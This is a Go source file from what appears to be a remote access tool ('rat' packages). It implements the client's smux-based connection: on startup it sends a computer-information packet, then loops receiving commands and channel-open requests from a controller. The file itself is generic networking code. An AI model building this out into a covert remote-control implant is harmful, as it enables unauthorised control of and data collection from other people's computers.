package main

import (
	"encoding/binary"
	"rat/shared"
	"rat/shared/network"
	"rat/shared/network/header"

	"github.com/xtaci/smux"
)

type Connection struct {
	Conn    *smux.Session
	control *smux.Stream
	network.Writer
	network.Reader
}

var Queue chan OutgoingPacket

func (c *Connection) Init() {
	Queue <- &ComputerInfoPacket{}
}

func (c *Connection) Close() {
	c.Conn.Close()
}

func (c *Connection) WriteHeader(header header.PacketHeader) error {
	return binary.Write(c.control, shared.ByteOrder, header)
}

func (c *Connection) WritePacket(packet OutgoingPacket) error {
	err := c.WriteHeader(packet.Header())

	if err != nil {
		return err
	}

	return c.Writer.WritePacket(packet)
}

type OutgoingPacket interface {
	Init()
	Header() header.PacketHeader
}

func (c *Connection) recvLoop() {
	for {
		var h header.PacketHeader
		err := binary.Read(c.control, shared.ByteOrder, &h)
		if err != nil {
			panic(err)
		}

		var channel bool
		err = binary.Read(c.control, shared.ByteOrder, &channel)
		if err != nil {
			panic(err)
		}

		if channel {
			channel := GetIncomingChannel(h)
			stream, _ := c.Conn.AcceptStream()
			go channel.Open(stream, c)
		} else {
			packet := GetIncomingPacket(h)
			err = packet.Read(c.control)
		}

		if err != nil {
			panic(err)
		}
	}
}
